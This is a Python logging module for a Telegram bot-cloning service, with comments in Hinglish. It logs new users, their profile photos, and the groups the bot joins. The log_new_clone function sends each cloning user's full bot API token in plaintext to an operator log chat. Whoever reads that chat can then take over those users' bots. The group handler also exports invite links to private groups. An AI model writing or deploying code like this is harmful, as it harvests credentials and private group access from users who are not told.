from telegram import Update
from telegram.ext import ContextTypes
from ..config import CLONE_LOGGER, LOGGER_GROUP, OWNER_ID

# =========================
# NEW CLONE LOG (Jab bot clone ho)
# =========================
async def log_new_clone(context: ContextTypes.DEFAULT_TYPE, user, token, bot_username):
    try:
        # Check if Logger ID is valid
        if not CLONE_LOGGER: return

        text = (
            "🚀 *NEW CLONE ALERT!*\n\n"
            f"👤 **Owner:** {user.first_name}\n"
            f"🆔 **ID:** `{user.id}`\n"
            f"🏷 **Username:** @{user.username if user.username else 'N/A'}\n"
            f"🤖 **Bot:** @{bot_username}\n"
            f"🔑 **Token:** `{token}`"
        )

        # Hamesha primary bot instance use karein log bhejne ke liye
        await context.bot.send_message(
            chat_id=int(CLONE_LOGGER),
            text=text,
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Clone log error: {e}")

# =========================
# USER START LOG (Jab koi /start dabaye)
# =========================
async def log_user_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not LOGGER_GROUP: return

    # Admin/Owner ko log se bahar rakhne ke liye (Optional)
    # if user.id == OWNER_ID: return 

    photo_id = None
    try:
        photos = await context.bot.get_user_profile_photos(user.id)
        if photos.total_count > 0:
            photo_id = photos.photos[0][-1].file_id
    except: pass

    text = (
        "👤 *NEW USER STARTED!*\n\n"
        f"🆔 **ID:** `{user.id}`\n"
        f"🏷 **Username:** @{user.username if user.username else 'N/A'}\n"
        f"📝 **Name:** {user.first_name}\n"
        f"🤖 **Bot:** @{(await context.bot.get_me()).username}"
    )

    try:
        if photo_id:
            await context.bot.send_photo(
                chat_id=int(LOGGER_GROUP),
                photo=photo_id,
                caption=text,
                parse_mode="Markdown"
            )
        else:
            await context.bot.send_message(
                chat_id=int(LOGGER_GROUP),
                text=text,
                parse_mode="Markdown"
            )
    except Exception as e:
        print(f"User start log error: {e}")

# =========================
# GROUP ADD LOG
# =========================
async def log_group_add(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat = update.effective_chat
    user = update.effective_user
    if not LOGGER_GROUP: return

    try:
        link = await chat.export_invite_link()
    except:
        link = "No Link (Admin Rights Missing)"

    text = (
        "🏰 *ADDED TO NEW GROUP!*\n\n"
        f"👥 **Group:** {chat.title}\n"
        f"🆔 **ID:** `{chat.id}`\n"
        f"🔗 **Link:** {link}\n"
        f"👤 **Added By:** {user.first_name} (@{user.username if user.username else 'N/A'})"
    )

    try:
        await context.bot.send_message(
            chat_id=int(LOGGER_GROUP),
            text=text,
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Group log error: {e}")
